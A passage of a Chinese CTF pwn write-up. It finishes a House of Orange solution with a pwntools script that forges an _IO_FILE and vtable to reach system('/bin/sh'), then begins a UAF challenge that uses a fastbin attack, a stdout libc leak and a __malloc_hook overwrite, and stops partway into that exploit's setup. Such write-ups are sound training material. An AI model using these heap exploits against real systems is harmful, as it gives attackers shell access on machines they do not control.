    md<span class="token punctuation">(</span><span class="token number">0x600</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 修改一系列所伪造好的布局</span>
</code></pre>
<p>修改结果如下</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> p *((struct _IO_FILE_plus*)0x5555557584f0).vtable
$2 = {
  __dummy = 93824994346440, 
  __dummy2 = 0, 
  __finish = 0x0, 
  __overflow = 0x7ffff7a52390 <__libc_system>, #成功修改为system
  __underflow = 0x0, 
  __uflow = 0x0, 
  __pbackfail = 0x0, 
  __xsputn = 0x0, 
  __xsgetn = 0x0, 
  __seekoff = 0x0, 
  __seekpos = 0x0, 
  __setbuf = 0x0, 
  __sync = 0x0, 
  __doallocate = 0x0, 
  __read = 0x0, 
  __write = 0x0, 
  __seek = 0x0, 
  __close = 0x0, 
  __stat = 0x0, 
  __showmanyc = 0x0, 
  __imbue = 0x0
}
</code></pre>
<h3 id="getshell-2"><a href="#getshell-2" class="headerlink" title="getshell"></a>getshell</h3><p>再次申请 0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;= 2*SIZE_SZ，就会触发malloc_printerr,然后就开始执行各种已经布局好的各种trick,最终执行到system get shell</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">int</span> iters <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
              <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// 执行该函数</span>
                             <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
          size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-python"><code class="language-python">sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#get shell</span></code></pre>
<h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile <span class="token operator">=</span> <span class="token string">'houseoforange'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
<span class="token comment" spellcheck="true">#libFile = './libc64-2.19.so'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
remotePort <span class="token operator">=</span> <span class="token number">0</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice : '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Name :'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Price of Orange:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice : '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Name:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Price of Orange:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice : '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    main_arena <span class="token operator">=</span> <span class="token number">0x3c4b20</span>

    ad<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1f00000010</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00fa1</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># top chunk size 0x20fa1</span>
    <span class="token comment" spellcheck="true"># top chunk addr 0x555555758060</span>
    <span class="token comment" spellcheck="true"># alignment: 555555779001 -> 0x1000</span>
    li<span class="token punctuation">(</span><span class="token string">'addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span><span class="token number">0xfa1</span> <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak libc base with overflow</span>
    ad<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>

    dp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> main_arena <span class="token operator">-</span> <span class="token number">1640</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak heap addr with large bin</span>
    md<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'CCCCCCCCCCCCCCCC'</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x0a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xc0</span>
    li<span class="token punctuation">(</span><span class="token string">'heap '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>

    _IO_list_all <span class="token operator">=</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'_IO_list_all '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>_IO_list_all<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Control program</span>
    p <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>

    <span class="token comment" spellcheck="true"># fake file</span>
    f <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token comment" spellcheck="true"># flag overflow arg -> system('/bin/sh')</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># _IO_read_ptr small bin size</span>
    <span class="token comment" spellcheck="true">#  unsoted bin attack</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_read_end)</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># _IO_read_base</span>

    <span class="token comment" spellcheck="true">#bypass check</span>
    <span class="token comment" spellcheck="true"># fp->_IO_write_base &lt; fp->_IO_write_ptr</span>

    <span class="token comment" spellcheck="true"># fp->mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_write_base </span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_write_ptr</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_write_end</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_buf_base</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_buf_end</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_save_base</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_backup_base</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_save_end</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># *_markers</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># *_chain</span>

    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _fileno</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _flags2</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># _old_offset</span>

    f <span class="token operator">+=</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ushort _cur_colum;</span>
    f <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># char _vtable_offset</span>
    f <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># char _shrotbuf[1]</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># null for alignment</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _offset</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _codecvt</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _wide_data</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _freeres_list</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _freeres_buf</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># __pad5</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _mode</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _unused2</span>

    <span class="token comment" spellcheck="true">#f = f.ljust(0xc0, '\x00')</span>

    p <span class="token operator">+=</span> f
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># alignment to vtable</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x5C8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># vtable</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>

    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>
    md<span class="token punctuation">(</span><span class="token number">0x600</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    db<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#get shell</span>

    <span class="token comment" spellcheck="true"># malloc(0x10) -> malloc_printerr -> overflow(IO_FILE addr) -> system('/bin/sh')</span>



<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="来源-5"><a href="#来源-5" class="headerlink" title="来源"></a>来源</h2><p>V&amp;N cnitlrt的面试,这是我自己按他要求出的题,然后自己打.</p>
<h2 id="难度-4"><a href="#难度-4" class="headerlink" title="难度"></a>难度</h2><p>5 / 10</p>
<h2 id="保护-5"><a href="#保护-5" class="headerlink" title="保护"></a>保护</h2><pre><code>   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      PIE enabled</code></pre>
<h2 id="简单描述-4"><a href="#简单描述-4" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有添加和删除功能, 添加的时候输入大小,再输入内容, 而删除根据索引进行删除.</p>
<h2 id="vul-6"><a href="#vul-6" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>

  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pheap <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//  UAF漏洞</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><p>fastbin attack, IO_FILE</p>
<h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>开辟一个small bin, 然后通过fastbin attack partial write 修改unsoted bin 的 fd 的后两字节指向<code>_IO_2_1_stderr</code> + 157处, 使用fastbin attack_IO_2_1_stdout`结构体中泄漏libc, 再次使用fastbin attack 打入malloc_hook - 0x23处打one_gadget, realloc的push次数调整execve第二个参数, 打通概率 1 /16</p>
<h2 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h2><h3 id="准备-2"><a href="#准备-2" class="headerlink" title="准备"></a>准备</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">'pwn'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
remotePort <span class="token operator">=</span> <span class="token number">0</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
